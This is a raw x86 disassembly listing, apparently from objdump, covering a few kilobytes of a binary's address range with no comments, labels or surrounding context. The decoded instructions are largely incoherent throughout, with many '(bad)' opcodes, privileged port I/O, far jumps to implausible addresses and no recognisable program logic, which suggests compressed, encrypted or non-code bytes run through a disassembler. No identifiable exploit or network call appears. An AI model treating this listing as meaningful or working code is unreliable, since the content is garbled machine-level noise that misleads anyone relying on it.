  44991b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44991c:	push   0xffffffaa
  44991e:	sbb    eax,0xc060c391
  449923:	xor    BYTE PTR [eax],bh
  449925:	test   BYTE PTR [ecx],0xe6
  449928:	push   0x5e9f50b7
  44992d:	gs pusha 
  44992f:	pop    eax
  449930:	mov    edi,0xa982fd18
  449935:	pop    ecx
  449936:	mov    ds:0x4a3af8f9,eax
  44993b:	xchg   ecx,eax
  44993c:	xor    al,0x2d
  44993e:	push   ebx
  44993f:	push   esi
  449940:	pusha  
  449941:	ret    
  449942:	imul   DWORD PTR [eax-0x5f]
  449945:	or     eax,0x6486e0f1
  44994a:	fwait
  44994b:	xchg   edi,eax
  44994c:	(bad)  
  44994d:	leave  
  44994e:	xlat   BYTE PTR ds:[ebx]
  44994f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449950:	out    0x8f,eax
  449952:	call   0x6fbef470
  449957:	mov    eax,ds:0xa54bd093
  44995c:	pop    esi
  44995d:	dec    esp
  44995e:	sub    eax,0x4a44cdc1
  449963:	push   ecx
  449964:	mov    ds:0x5edc9f65,eax
  449969:	xchg   ebp,eax
  44996a:	pushf  
  44996b:	mov    esi,0xec014e
  449970:	pop    esi
  449971:	repz (bad) 
  449973:	jae    0x449912
  449975:	or     al,0x8
  449977:	cmp    BYTE PTR [eax+0x5e],al
  44997a:	xor    BYTE PTR [edi+edx*1-0x5938279d],dh
  449981:	ja     0x4499ba
  449983:	pushf  
  449984:	and    ah,BYTE PTR [ecx-0x39be38e0]
  44998a:	out    dx,al
  44998b:	imul   esi,DWORD PTR [ecx+0x53392b5b],0xfa21c61
  449995:	jecxz  0x449961
  449997:	lea    esi,[ebx]
  449999:	arpl   di,sp
  44999b:	pop    ebx
  44999c:	cmp    DWORD PTR [edx+esi*2+0x7fc1544d],ecx
  4499a3:	mov    ebp,0x60e5ac97
  4499a8:	inc    eax
  4499a9:	test   cl,ah
  4499ab:	ret    
  4499ac:	stos   BYTE PTR es:[edi],al
  4499ad:	jne    0x44999c
  4499af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4499b0:	mov    esp,0x2d8b951f
  4499b5:	icebp  
  4499b6:	push   ds
  4499b7:	push   eax
  4499b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4499b9:	dec    ebp
  4499ba:	adc    al,0x25
  4499bc:	int    0x60
  4499be:	dec    eax
  4499bf:	ja     0x44995b
  4499c1:	(bad)
  4499c4:	pop    esi
  4499c5:	call   0x500fb939
  4499ca:	sbb    al,0xe2
  4499cc:	popf   
  4499cd:	pusha  
  4499ce:	clc    
  4499cf:	mov    WORD PTR [esi-0x5],cs
  4499d2:	dec    ebx
  4499d3:	cs cmp bl,bl
  4499d6:	add    ah,BYTE PTR [eax+eax*4]
  4499d9:	jg     0x449a09
  4499db:	ror    DWORD PTR [eax],1
  4499dd:	leave  
  4499de:	mov    DWORD PTR [eax],esp
  4499e0:	iret   
  4499e1:	push   edx
  4499e2:	inc    edi
  4499e3:	jmp    0x4499e4
  4499e5:	pop    es
  4499e6:	dec    esi
  4499e7:	sbb    dh,BYTE PTR [edx+0x3a42ae37]
  4499ed:	pushf  
  4499ee:	out    dx,eax
  4499ef:	sbb    DWORD PTR [ecx],esi
  4499f1:	loope  0x4499c5
  4499f3:	add    BYTE PTR fs:[esi-0x57107706],dl
  4499fa:	add    esp,DWORD PTR [eax+0x7ef5d552]
  449a00:	lahf   
  449a01:	jmp    0x449a59
  449a03:	repz jbe 0x449986
  449a06:	mov    cl,0xf6
  449a08:	xor    DWORD PTR [ecx],esi
  449a0a:	and    DWORD PTR [ebx],0x1524aa41
  449a10:	test   DWORD PTR [eax],esp
  449a12:	pushf  
  449a13:	push   edi
  449a14:	pop    ds
  449a15:	popa   
  449a16:	inc    esp
  449a17:	mov    bl,0x94
  449a19:	jbe    0x449a6a
  449a1b:	push   esp
  449a1c:	out    dx,eax
  449a1d:	in     eax,dx
  449a1e:	out    dx,al
  449a1f:	daa    
  449a20:	out    dx,al
  449a21:	jmp    0x4499d5
  449a23:	dec    esp
  449a24:	pop    edx
  449a25:	outs   dx,BYTE PTR ds:[esi]
  449a26:	repnz sahf 
  449a28:	jmp    0x449a2d
  449a2a:	dec    esi
  449a2c:	sbb    edx,0xffffffce
  449a2f:	jne    0x449a2b
  449a31:	add    BYTE PTR [ebp-0x1e],ch
  449a34:	push   ebx
  449a35:	imul   ah
  449a37:	pop    ebp
  449a38:	pop    esi
  449a39:	(bad)  
  449a3b:	xchg   BYTE PTR [ebx+0x43a15c04],dh
  449a41:	hlt    
  449a42:	scas   al,BYTE PTR es:[edi]
  449a43:	scas   al,BYTE PTR es:[edi]
  449a44:	pop    es
  449a45:	jecxz  0x449a2e
  449a47:	and    BYTE PTR [ebx+0x3a],0x72
  449a4b:	loop   0x449a32
  449a4d:	rcl    BYTE PTR [ebx+ecx*1-0x5ed3ef97],0xce
  449a55:	add    edx,DWORD PTR [esi]
  449a57:	adc    esi,DWORD PTR [ecx+0x67]
  449a5a:	out    0xc3,eax
  449a5c:	pop    esi
  449a5d:	and    eax,0x34615c3f
  449a62:	retf   0xad45
  449a65:	pop    ebp
  449a66:	jb     0x449abd
  449a68:	clc    
  449a69:	xchg   DWORD PTR [eax],edi
  449a6b:	add    dh,dl
  449a6d:	cmp    eax,0xed5e260e
  449a72:	xchg   edi,eax
  449a73:	call   0x204adad7
  449a78:	mov    al,0xb2
  449a7a:	xchg   ebp,eax
  449a7b:	mov    eax,ds:0x9796c73b
  449a80:	(bad)  
  449a81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449a82:	add    esi,DWORD PTR [edi]
  449a84:	pop    esi
  449a85:	mov    esi,0xf42add0f
  449a8a:	ds push cs
  449a8c:	fimul  DWORD PTR [edx-0x52]
  449a8f:	push   ds
  449a90:	cmp    al,0x60
  449a92:	dec    edi
  449a93:	jo     0x449b00
  449a95:	push   0x922c811c
  449a9a:	push   eax
  449a9b:	rcl    BYTE PTR [ebx+0x5d],cl
  449a9e:	jle    0x449aa1
  449aa0:	call   0xd35f:0x9e0a40f3
  449aa7:	mov    eax,0xd4fe60f7
  449aac:	xchg   DWORD PTR [ebp+ebx*2+0x1295a250],eax
  449ab3:	or     esp,DWORD PTR [esi+0x2]
  449ab6:	mov    eax,es:0xef15c2d
  449abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449abd:	cmp    dl,ch
  449abf:	scas   al,BYTE PTR es:[edi]
  449ac0:	push   ss
  449ac1:	and    bl,BYTE PTR [esi-0x5e]
  449ac4:	and    BYTE PTR [esi-0x69],dh
  449ac7:	sbb    ah,0x45
  449aca:	pop    esp
  449acb:	jge    0x449b17
  449acd:	popf   
  449ace:	out    dx,al
  449acf:	mov    ch,0x5
  449ad1:	push   ebp
  449ad2:	es fcomip st,st(7)
  449ad5:	sar    DWORD PTR [edi+eiz*4+0x1937499c],cl
  449adc:	fsub   st,st(0)
  449ade:	popa   
  449adf:	daa    
  449ae0:	sub    BYTE PTR [esi],bl
  449ae2:	out    dx,al
  449ae3:	fwait
  449ae4:	mov    al,0x82
  449ae6:	sub    ebx,edi
  449ae8:	push   eax
  449ae9:	cmp    BYTE PTR [eax-0x5f],cl
  449aec:	test   BYTE PTR ss:[esi-0x3a],dl
  449af0:	push   ebx
  449af1:	aam    0x1c
  449af3:	fwait
  449af4:	pop    ebx
  449af5:	rol    BYTE PTR [ebx+0x41],0xac
  449af9:	mov    bl,0xfe
  449afb:	pop    es
  449afc:	xlat   BYTE PTR ds:[ebx]
  449afd:	mov    bh,0xe9
  449aff:	mov    ?,WORD PTR [esi]
  449b01:	adc    al,0x29
  449b03:	outs   dx,DWORD PTR ds:[esi]
  449b04:	pop    esi
  449b05:	(bad)  
  449b06:	sbb    cl,BYTE PTR gs:[edi]
  449b09:	ficom  WORD PTR [ecx+0x4d2e5bc6]
  449b0f:	out    0x3c,al
  449b11:	ss into 
  449b13:	leave  
  449b14:	data16 mov ch,0x6e
  449b17:	mov    eax,ds:0x9397e752
  449b1c:	xor    eax,0x5df7b006
  449b21:	xchg   edi,eax
  449b22:	int    0x86
  449b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449b25:	or     al,0x91
  449b27:	jge    0x449b17
  449b29:	sbb    edi,DWORD PTR [ebx+0x7723d7a1]
  449b2f:	fcomp  DWORD PTR [ecx+esi*4-0x78c7ff4f]
  449b36:	out    dx,al
  449b37:	add    edx,DWORD PTR [eax]
  449b39:	repz pop ecx
  449b3b:	(bad)  
  449b3c:	std    
  449b3d:	cmp    BYTE PTR [edi-0x69],ch
  449b40:	dec    esp
  449b41:	mov    eax,ds:0x56f2a273
  449b46:	push   ecx
  449b47:	xchg   edx,eax
  449b48:	or     BYTE PTR [ebp-0x17a1a1d8],ch
  449b4e:	push   0xffffff84
  449b50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449b51:	and    BYTE PTR [esi+0x3b],ch
  449b54:	cwde   
  449b55:	pusha  
  449b56:	ror    DWORD PTR [ebx],1
  449b58:	(bad)  
  449b59:	int3   
  449b5a:	mov    WORD PTR [esi-0x6e181afa],fs
  449b60:	fs aam 0xd9
  449b63:	daa    
  449b64:	ds pushf 
  449b66:	xchg   ebp,eax
  449b67:	repnz pop ebx
  449b69:	push   edx
  449b6a:	or     ch,cl
  449b6c:	iret   
  449b6d:	aas    
  449b6e:	into   
  449b6f:	xchg   esi,eax
  449b70:	xchg   DWORD PTR [edi],ebx
  449b72:	xor    al,0xc5
  449b74:	pop    esi
  449b75:	jbe    0x449b29
  449b77:	cdq    
  449b78:	cmc    
  449b79:	or     BYTE PTR [ebp-0x2d],dl
  449b7c:	pop    es
  449b7d:	addr16 xchg esi,eax
  449b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449b80:	sar    DWORD PTR [edx+0x60aed36c],cl
  449b86:	aaa    
  449b87:	pop    eax
  449b88:	push   edi
  449b89:	or     eax,0xcd5ebff0
  449b8e:	dec    edi
  449b8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449b90:	jns    0x449bb6
  449b92:	pusha  
  449b93:	xor    eax,0xf5bf611d
  449b98:	add    edi,esp
  449b9a:	mov    ecx,0x483f9cd3
  449b9f:	sbb    DWORD PTR [esi+0x3e],0x3b
  449ba3:	mov    WORD PTR [edx-0x4242fd07],?
  449ba9:	pusha  
  449baa:	xchg   BYTE PTR [ebx+0x3ae298a4],bh
  449bb0:	add    bh,BYTE PTR [ebx]
  449bb2:	fnstcw WORD PTR [eax+0x5e]
  449bb5:	ror    BYTE PTR [ecx-0x6897665c],cl
  449bbb:	shl    DWORD PTR [eax-0x5b9cfea0],cl
  449bc1:	lods   al,BYTE PTR ds:[esi]
  449bc2:	repnz test eax,0x9a60d361
  449bc8:	pop    esi
  449bc9:	or     bl,dl
  449bcb:	hlt    
  449bcc:	sbb    DWORD PTR [ebx+ecx*1-0x6a9edf2b],ebp
  449bd3:	loope  0x449b7d
  449bd5:	cld    
  449bd6:	mov    ds:0xee489799,al
  449bdb:	adc    ebx,ebp
  449bdd:	sub    eax,0xb910056f
  449be2:	inc    ecx
  449be3:	mov    eax,ds:0xd9732af3
  449be8:	mov    bl,0x44
  449bea:	hlt    
  449beb:	outs   dx,BYTE PTR ds:[esi]
  449bec:	pop    esi
  449bed:	jae    0x449b7f
  449bef:	jecxz  0x449c6b
  449bf1:	popf   
  449bf2:	mov    bl,BYTE PTR [edi]
  449bf4:	(bad)  
  449bf5:	pop    ebp
  449bf6:	xchg   ebx,eax
  449bf7:	pop    edx
  449bf8:	sub    al,0x1
  449bfa:	(bad)  
  449bfb:	iret   
  449bfc:	push   0xffffffd9
  449bfe:	rcl    DWORD PTR [eax-0x77b61682],1
  449c04:	pop    esi
  449c05:	outs   dx,BYTE PTR ds:[esi]
  449c06:	nop
  449c07:	mov    dl,0x58
  449c09:	and    ah,cl
  449c0b:	ja     0x449c0f
  449c0d:	xor    BYTE PTR [ebx-0x606d085f],dh
  449c13:	push   esi
  449c14:	add    DWORD PTR [ebx],0x12
  449c17:	icebp  
  449c18:	pop    esp
  449c19:	fs jmp 0xdefd:0x2b91b4cb
  449c21:	lods   al,BYTE PTR ds:[esi]
  449c22:	sbb    eax,0x375febd8
  449c27:	shl    cl,cl
  449c29:	lods   al,BYTE PTR ds:[esi]
  449c2a:	mov    dl,0x54
  449c2c:	cmp    DWORD PTR [edx+edx*1+0x35725d5e],0x6e
  449c34:	jo     0x449c43
  449c36:	jmp    0x2a2a0a45
  449c3b:	mov    eax,ds:0x50ed133
  449c40:	inc    esi
  449c41:	add    al,0x66
  449c43:	inc    ebx
  449c44:	dec    esp
  449c45:	add    edx,DWORD PTR [ebp-0x2ad5a18a]
  449c4b:	pop    edi
  449c4c:	cmp    DWORD PTR [edx+0x4],edi
  449c4f:	mov    eax,ds:0xabb645a1
  449c54:	mov    WORD PTR [eax-0x43a00ef4],gs
  449c5a:	sar    BYTE PTR [ebx+0x403ea399],0xae
  449c61:	rcr    edi,cl
  449c63:	std    
  449c64:	push   cs
  449c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449c66:	fisub  DWORD PTR [eax-0x72f181a9]
  449c6c:	imul   esi,DWORD PTR [esi],0xffffff84
  449c6f:	stc    
  449c70:	pop    esi
  449c71:	sub    BYTE PTR [ebx+0x1a1ea053],bl
  449c77:	inc    ecx
  449c78:	out    0x22,al
  449c7a:	cmp    DWORD PTR [ecx-0x65cf9a00],esp
  449c80:	pop    esp
  449c81:	push   eax
  449c82:	mov    ch,0xf5
  449c84:	pop    esi
  449c85:	std    
  449c86:	sbb    eax,DWORD PTR [ebp-0x5172f9da]
  449c8c:	dec    edi
  449c8d:	popa   
  449c8e:	test   DWORD PTR [ecx-0x5922cf9],ebp
  449c94:	rcl    ecx,cl
  449c96:	push   es
  449c97:	mov    DWORD PTR [edi+0x1e6ae861],ecx
  449c9d:	xor    BYTE PTR [esi+0x476813a1],bl
  449ca3:	mov    ch,0xb6
  449ca5:	mov    eax,0x695e440a
  449caa:	lods   al,BYTE PTR ds:[esi]
  449cab:	push   edx
  449cac:	mov    gs,WORD PTR [edx-0x27]
  449caf:	mov    edx,0x9b6c6756
  449cb4:	fild   WORD PTR ds:0x740718ff
  449cba:	out    dx,al
  449cbb:	cmp    al,0xdf
  449cbd:	cs pop ebp
  449cbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449cc0:	xlat   BYTE PTR ds:[ebx]
  449cc1:	jno    0x449c43
  449cc3:	test   al,0x46
  449cc5:	push   cs
  449cc6:	push   edx
  449cc7:	mov    ah,0x88
  449cc9:	push   eax
  449cca:	pop    ecx
  449ccb:	add    DWORD PTR [edi+0x3c],0xffffffee
  449ccf:	mov    ebp,0x7a173ff6
  449cd4:	mov    edx,0x6ea1812e
  449cd9:	jmp    0x449c63
  449cdb:	jnp    0x449c8c
  449cdd:	push   ebp
  449cde:	ror    cl,cl
  449ce0:	pop    esi
  449ce1:	sub    ebp,DWORD PTR [esi-0x50]
  449ce4:	and    al,0xf6
  449ce6:	jmp    0x449ce7
  449ce8:	std    
  449ce9:	pusha  
  449cea:	dec    ecx
  449ceb:	jecxz  0x449d60
  449ced:	adc    BYTE PTR [edi],0x8e
  449cf0:	adc    ebx,DWORD PTR [edx-0x14f82312]
  449cf6:	inc    ebp
  449cf7:	mov    ds:0x99caa2eb,eax
  449cfc:	inc    edx
  449cfd:	shr    cl,1
  449cff:	inc    edi
  449d00:	fnstsw WORD PTR [eax]
  449d02:	cmp    BYTE PTR [ebp-0x62a11ef4],cl
  449d08:	pop    edx
  449d09:	pop    eax
  449d0a:	add    esi,DWORD PTR [edx-0x5e9d5b91]
  449d10:	jnp    0x449cfc
  449d12:	mov    al,0x89
  449d14:	je     0x449d25
  449d16:	iret   
  449d17:	or     BYTE PTR [esi-0x66],bl
  449d1a:	popa   
  449d1b:	xchg   ebx,eax
  449d1c:	xor    al,0xa6
  449d1e:	xor    bl,ah
  449d20:	int3   
  449d21:	pusha  
  449d22:	aaa    
  449d23:	jg     0x449d31
  449d25:	(bad)  
  449d26:	cmp    BYTE PTR ds:0x6eeebe0,ah
  449d2c:	and    al,0x19
  449d2e:	leave  
  449d2f:	xchg   edi,eax
  449d30:	test   DWORD PTR [edx-0x44fe5e8e],eax
  449d36:	xchg   BYTE PTR [edi+0xd],dh
  449d39:	inc    ebp
  449d3a:	pop    ss
  449d3b:	pop    ss
  449d3c:	pop    edx
  449d3d:	ins    DWORD PTR es:[edi],dx
  449d3e:	cld    
  449d3f:	scas   eax,DWORD PTR es:[edi]
  449d40:	mov    eax,ds:0x49d36e6d
  449d45:	jae    0x449d17
  449d47:	mov    ss,WORD PTR [ecx+0x7]
  449d4a:	push   ds
  449d4b:	loope  0x449d29
  449d4d:	xor    DWORD PTR [edx-0xbe36b9],edi
  449d53:	mov    eax,0x7b6e0fdf
  449d58:	jge    0x449d55
  449d5a:	and    al,0xbc
  449d5c:	xchg   ebx,eax
  449d5d:	sub    ebp,DWORD PTR [ecx+eiz*4]
  449d60:	fwait
  449d61:	out    dx,al
  449d62:	push   ecx
  449d63:	aam    0x5f
  449d65:	dec    ecx
  449d66:	mov    ebp,0xc6775e9d
  449d6b:	push   edx
  449d6c:	jno    0x449d86
  449d6e:	pop    es
  449d6f:	fbld   TBYTE PTR [eax]
  449d71:	pop    edx
  449d72:	mov    WORD PTR [edi-0x53],ss
  449d75:	clc    
  449d76:	pop    edx
  449d77:	push   ecx
  449d78:	sub    ebp,edx
  449d7a:	ror    edi,1
  449d7c:	pop    esi
  449d7d:	inc    ebx
  449d7e:	push   esi
  449d7f:	dec    esp
  449d80:	stos   BYTE PTR es:[edi],al
  449d81:	mov    eax,ds:0x2510d92f
  449d86:	cdq    
  449d87:	mov    ds:0xc67c3fd5,eax
  449d8c:	or     al,0x2
  449d8e:	mov    cl,BYTE PTR cs:[edi]
  449d91:	ds out dx,al
  449d93:	int3   
  449d94:	imul   ebx,DWORD PTR [ebp+0x56],0xc4de269c
  449d9b:	mov    al,ds:0x8d297827
  449da0:	jns    0x449d7e
  449da2:	push   edx
  449da3:	sbb    BYTE PTR [esi-0x7a],0x94
  449da7:	out    0x48,eax
  449da9:	mov    ss,WORD PTR [ecx]
  449dab:	fwait
  449dac:	in     eax,dx
  449dad:	pusha  
  449dae:	arpl   di,di
  449db0:	push   ds
  449db1:	inc    ecx
  449db2:	sub    ah,BYTE PTR [esp+edx*4]
  449db5:	jle    0x449daa
  449db7:	dec    eax
  449db8:	lods   al,BYTE PTR ds:[esi]
  449db9:	bound  eax,QWORD PTR [ecx+eiz*4+0x57823a92]
  449dc0:	adc    al,0x61
  449dc2:	dec    ebp
  449dc3:	inc    edi
  449dc4:	dec    ecx
  449dc5:	mov    ah,0x37
  449dc7:	push   eax
  449dc8:	outs   dx,BYTE PTR ds:[esi]
  449dc9:	mov    ebx,0xe1a6c800
  449dce:	out    dx,al
  449dcf:	sub    esi,esp
  449dd1:	jne    0x449e1d
  449dd3:	inc    esi
  449dd4:	aam    0x5f
  449dd6:	adc    al,BYTE PTR [eax-0x62]
  449dd9:	repz sbb al,0x84
  449ddc:	inc    esi
  449ddd:	rol    DWORD PTR [ecx+0x3a013508],0xa4
  449de4:	cld    
  449de5:	inc    ebx
  449de6:	fimul  WORD PTR [edx-0x1f]
  449de9:	mov    eax,0x60c398ab
  449dee:	jecxz  0x449e6a
  449df0:	push   cs
  449df1:	sub    ebx,ebp
  449df3:	inc    ebp
  449df4:	mov    al,ds:0xde133f73
  449df9:	xchg   edi,eax
  449dfa:	out    0x77,eax
  449dfc:	pop    ecx
  449dfd:	xchg   ebp,eax
  449dfe:	shl    DWORD PTR [eax+0x470990a1],0x1e
  449e05:	push   esp
  449e06:	push   ss
  449e07:	cld    
  449e08:	pop    esi
  449e09:	adc    edx,esp
  449e0b:	push   ebp
  449e0c:	fwait
  449e0d:	push   edi
  449e0e:	sti    
  449e0f:	xor    edx,esp
  449e11:	pusha  
  449e12:	sbb    bh,BYTE PTR [ecx]
  449e14:	xor    esi,DWORD PTR [esi+0x6a08b465]
  449e1a:	out    dx,al
  449e1b:	mov    gs,edi
  449e1d:	(bad)  
  449e1e:	pop    esp
  449e1f:	or     eax,0xa0dea9aa
  449e24:	jbe    0x449e79
  449e26:	inc    eax
  449e27:	and    dl,al
  449e29:	mov    dh,0xa1
  449e2b:	stos   DWORD PTR es:[edi],eax
  449e2c:	scas   al,BYTE PTR es:[edi]
  449e2d:	sub    bl,0xee
  449e30:	nop
  449e31:	popa   
  449e32:	arpl   WORD PTR [ecx],si
  449e34:	js     0x449dbe
  449e36:	xchg   esi,eax
  449e37:	dec    ecx
  449e38:	pop    ss
  449e39:	popa   
  449e3a:	and    eax,0x5d6894fb
  449e3f:	sub    ah,0x52
  449e42:	out    dx,al
  449e43:	add    edx,DWORD PTR gs:[ecx-0xe]
  449e47:	push   ss
  449e48:	js     0x449ec7
  449e4a:	jge    0x449ded
  449e4c:	repz sti 
  449e4e:	mov    dh,0x75
  449e50:	pop    es
  449e51:	pop    edi
  449e52:	hlt    
  449e53:	dec    ecx
  449e54:	pop    edi
  449e55:	into   
  449e56:	xor    al,0xe2
  449e58:	ins    DWORD PTR es:[edi],dx
  449e59:	mov    WORD PTR gs:[ecx],gs
  449e5c:	jmp    0x65f358ad
  449e61:	lds    ebp,FWORD PTR [esi+0x31]
  449e64:	jnp    0x449eb5
  449e66:	das    
  449e67:	xchg   esi,eax
  449e68:	sbb    al,0xa0
  449e6a:	sti    
  449e6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449e6c:	aas    
  449e6d:	dec    ecx
  449e6e:	out    dx,al
  449e6f:	adc    DWORD PTR [edi+edi*8-0x46],edx
  449e73:	or     DWORD PTR [esi+0x60],0xcd58f1c8
  449e7a:	mov    dl,0x4a
  449e7c:	pop    edi
  449e7d:	mov    ecx,0xd65e7110
  449e82:	mov    DWORD PTR [eax+eax*1+0x36],esi
  449e86:	push   es
  449e87:	daa    
  449e88:	push   esp
  449e89:	dec    ebx
  449e8a:	cmp    al,0xf2
  449e8c:	aas    
  449e8d:	mov    bl,0xed
  449e8f:	inc    ecx
  449e91:	in     eax,dx
  449e92:	or     al,0xb8
  449e94:	test   DWORD PTR [ecx+0x6118642a],eax
  449e9a:	cmp    eax,0x782b4240
  449e9f:	daa    
  449ea0:	outs   dx,DWORD PTR ds:[esi]
  449ea1:	int    0xee
  449ea3:	jb     0x449ea1
  449ea5:	lods   al,BYTE PTR ds:[esi]
  449ea6:	ins    DWORD PTR es:[edi],dx
  449ea7:	fistp  QWORD PTR [esi+esi*8+0x18]
  449eab:	test   al,0x3e
  449ead:	ins    DWORD PTR es:[edi],dx
  449eae:	stos   BYTE PTR es:[edi],al
  449eaf:	mov    ?,WORD PTR [esi+0x60]
  449eb2:	mov    eax,ds:0x867b95cb
  449eb7:	sub    al,0xeb
  449eb9:	push   eax
  449eba:	cs sbb ebx,0x2a4b43a9
  449ec1:	push   ebx
  449ec2:	(bad)  
  449ec3:	jge    0x449eb5
  449ec5:	and    ecx,DWORD PTR [esi]
  449ec7:	loopne 0x449e5a
  449ec9:	lahf   
  449eca:	push   esi
  449ecb:	jp     0x449f2b
  449ecd:	pop    ss
  449ece:	cld    
  449ecf:	ja     0x449ee3
  449ed1:	sbb    al,0x66
  449ed3:	xor    al,0xf7
  449ed5:	pusha  
  449ed6:	pop    DWORD PTR [ecx-0x1ca65c59]
  449edc:	inc    ebp
  449edd:	sbb    ebp,esi
  449edf:	ret    
  449ee0:	sahf   
  449ee1:	mov    esi,DWORD PTR [ebp-0x68]
  449ee4:	jp     0x449f4b
  449ee6:	inc    esi
  449ee7:	mov    cs,esi
  449ee9:	test   BYTE PTR [eax+eiz*8+0x10],bh
  449eed:	fisubr WORD PTR [esi-0x30]
  449ef0:	or     al,0x98
  449ef2:	xchg   edi,eax
  449ef3:	outs   dx,BYTE PTR fs:[esi]
  449ef5:	jecxz  0x449ef7
  449ef7:	outs   dx,BYTE PTR ds:[esi]
  449ef8:	int3   
  449ef9:	dec    esi
  449efa:	in     al,dx
  449efb:	stc    
  449efc:	mov    ah,0x40
  449efe:	pusha  
  449eff:	adc    eax,0x8a19a8c
  449f05:	pop    es
  449f06:	dec    esi
  449f07:	rcr    dl,0x81
  449f0a:	mov    dh,0x7
  449f0c:	pop    esi
  449f0d:	and    DWORD PTR [ebx-0x3],esp
  449f10:	test   eax,0xc6438bca
  449f15:	pusha  
  449f16:	in     al,0x52
  449f18:	xor    ch,BYTE PTR [ebx-0x73711007]
  449f1e:	out    dx,al
  449f1f:	int3   
  449f20:	jmpw   0x2f7
  449f24:	cdq    
  449f25:	aas    
  449f26:	cmp    BYTE PTR [edi-0x1f3c8d81],cl
  449f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449f2d:	sbb    DWORD PTR [ebx],esp
  449f2f:	jns    0x449f6f
  449f31:	add    al,dh
  449f33:	dec    edi
  449f34:	xor    eax,0xc26126ac
  449f39:	pop    esp
  449f3a:	adc    WORD PTR [edi-0x732569a0],si
  449f41:	adc    bh,BYTE PTR [ecx+edx*2-0x55233527]
  449f48:	pop    esi
  449f49:	js     0x449f6d
  449f4b:	mov    esp,0xd22079de
  449f50:	add    BYTE PTR [ecx-0x5c],ah
  449f53:	jbe    0x449f99
  449f55:	and    DWORD PTR [edx],ecx
  449f57:	sub    al,0xfc
  449f59:	and    eax,0xa8f983eb
  449f5e:	fadd   DWORD PTR [eax-0x70]
  449f61:	aad    0xd6
  449f63:	sub    BYTE PTR [eax-0x7c5e648a],dh
  449f69:	xlat   BYTE PTR ds:[ebx]
  449f6a:	sub    edx,ebp
  449f6c:	fidivr DWORD PTR [ebx-0x51a1bc92]
  449f72:	aas    
  449f73:	retf   0x9153
  449f76:	pop    ebp
  449f77:	pusha  
  449f78:	push   edi
  449f79:	pop    esi
  449f7a:	ins    DWORD PTR es:[edi],dx
  449f7b:	sub    dh,BYTE PTR [ebx-0x192cc3fa]
  449f81:	mov    DWORD PTR [edi+eax*2],ebx
  449f84:	pusha  
  449f85:	aaa    
  449f86:	or     DWORD PTR [eax+0x205787dc],0xf0102079
  449f90:	pop    ebp
  449f91:	mov    ah,0x40
  449f93:	mov    eax,ds:0x387781c2
  449f98:	in     al,0xf7
  449f9a:	in     al,dx
  449f9b:	scas   eax,DWORD PTR es:[edi]
  449f9c:	pop    esi
  449f9d:	cwde   
  449f9e:	pop    edx
  449f9f:	inc    esp
  449fa0:	ins    DWORD PTR es:[edi],dx
  449fa1:	push   ds
  449fa2:	and    BYTE PTR [edx-0x5f4d5d03],ch
  449fa8:	fistp  WORD PTR [esi+0x6e4ffaeb]
  449fae:	dec    DWORD PTR [esi]
  449fb0:	pop    ebx
  449fb1:	cmp    DWORD PTR ds:0x9c49cdd4,edx
  449fb7:	mov    ebp,0xf8eb2c19
  449fbc:	ficomp DWORD PTR [edi-0x673f4cbb]
  449fc2:	ss ins BYTE PTR es:[edi],dx
  449fc4:	in     eax,dx
  449fc5:	xor    eax,0x735e8ed9
  449fca:	aad    0xf4
  449fcc:	sahf   
  449fcd:	xchg   esp,eax
  449fce:	icebp  
  449fcf:	add    ebx,DWORD PTR [edx-0x6211aba0]
  449fd5:	xor    al,0x24
  449fd7:	imul   ecx,ebx,0x5c1fee62
  449fdd:	cmp    al,dh
  449fdf:	mov    ds:0xa12297d5,al
  449fe4:	mov    ebp,0xb645ad03
  449fe9:	popf   
  449fea:	jle    0x449f9a
  449fec:	pusha  
  449fed:	pop    es
  449fee:	dec    ebx
  449fef:	pop    es
  449ff0:	das    
  449ff1:	repnz sbb ch,BYTE PTR [eax]
  449ff4:	ret    0x3e43
  449ff7:	adc    al,bh
  449ff9:	xor    eax,0xd771bce6
  449ffe:	enter  0x43a2,0x9a
  44a002:	addr16 (bad) 
  44a004:	sahf   
  44a005:	dec    ebx
  44a006:	pushf  
  44a007:	mov    cl,0x5e
  44a009:	lock xor al,0x3d
  44a00c:	dec    ebp
  44a00d:	mov    dh,0x7f
  44a00f:	mov    ds:0x9c735d6c,al
  44a014:	in     eax,dx
  44a015:	(bad)  
  44a016:	sti    
  44a017:	xor    DWORD PTR [esi+0x79],0xcd5fee88
  44a01e:	jecxz  0x449fea
  44a020:	sub    al,0xf6
  44a022:	loop   0x44a034
  44a024:	jae    0x449ffc
  44a026:	std    
  44a027:	mov    al,ds:0xcfe862b4
  44a02c:	inc    eax
  44a02d:	push   edx
  44a02e:	pop    esi
  44a02f:	rcr    DWORD PTR [ebp-0x10],cl
  44a032:	inc    edx
  44a033:	jecxz  0x44a00f
  44a035:	js     0x449fc1
  44a037:	lea    ebx,[esi]
  44a039:	shr    DWORD PTR [ebp+0x8608113],1
  44a03f:	jns    0x449fe1
  44a041:	stc    
  44a042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a043:	mov    DWORD PTR [ebp+0x68],edx
  44a046:	lock dec edi
  44a048:	cmp    ah,ch
  44a04a:	lea    eax,[ecx+0x71]
  44a04d:	jo     0x44a0a3
  44a04f:	in     al,0x23
  44a051:	popa   
  44a052:	sti    
  44a053:	jle    0x449fee
  44a055:	mov    esi,0xfec5732f
  44a05a:	out    dx,al
  44a05b:	leave  
  44a05c:	mov    ebx,0x8f285bc3
  44a061:	daa    
  44a062:	mov    ah,BYTE PTR [ecx-0x7060cae7]
  44a068:	jge    0x44a0bc
  44a06a:	cmp    al,BYTE PTR [ecx+0x5d]
  44a06d:	xchg   ebp,eax
  44a06e:	push   ds
